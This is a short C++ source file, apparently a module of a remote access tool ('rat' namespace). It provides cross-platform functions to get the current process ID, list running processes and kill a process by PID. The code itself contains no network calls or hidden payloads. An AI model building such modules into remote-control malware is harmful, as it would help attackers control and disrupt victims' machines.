#include "rat/system.hpp"

#if defined(_WIN32)
#include <windows.h>
#include <tlhelp32.h>
#else
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <dirent.h>
#include <cstring>
#endif

namespace rat::system {

// -------------------------------
// Process Management
// -------------------------------

// -------------------------------
// Process Management Helpers
// -------------------------------

// Get current process ID
uint32_t getProcessId(void) {
#if defined(_WIN32)
    return static_cast<uint32_t>(GetCurrentProcessId());
#else
    return static_cast<uint32_t>(getpid());
#endif
}

// List running processes
std::string listProcesses(void) {
    if (!isElevatedPrivileges()) {
        return "[!] Insufficient privileges to list all processes.";
    }

#if defined(_WIN32)
    std::ostringstream oss;
    PROCESSENTRY32 pe32{};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return {};

    if (Process32First(hSnapshot, &pe32)) {
        do {
            oss << fmt::format("{} (PID {})\n", pe32.szExeFile, pe32.th32ProcessID);
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return oss.str();
#else
    std::ostringstream oss;
    DIR* procDir = opendir("/proc");
    if (!procDir) return {};

    struct dirent* entry;
    while ((entry = readdir(procDir)) != nullptr) {
        if (entry->d_type == DT_DIR && std::all_of(entry->d_name, entry->d_name + std::strlen(entry->d_name),
                                                   ::isdigit)) {
            oss << entry->d_name << "\n";
        }
    }
    closedir(procDir);
    return oss.str();
#endif
}

// Kill process by PID
bool killProcess(uint32_t arg_Pid) {
    if (!isElevatedPrivileges()) {
        return false;
    }

#if defined(_WIN32)
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, arg_Pid);
    if (!hProcess) return false;
    bool result = TerminateProcess(hProcess, 1);
    CloseHandle(hProcess);
    return result;
#else
    int status = kill(static_cast<pid_t>(arg_Pid), SIGKILL);
    return (status == 0);
#endif
}

} // namespace rat::system

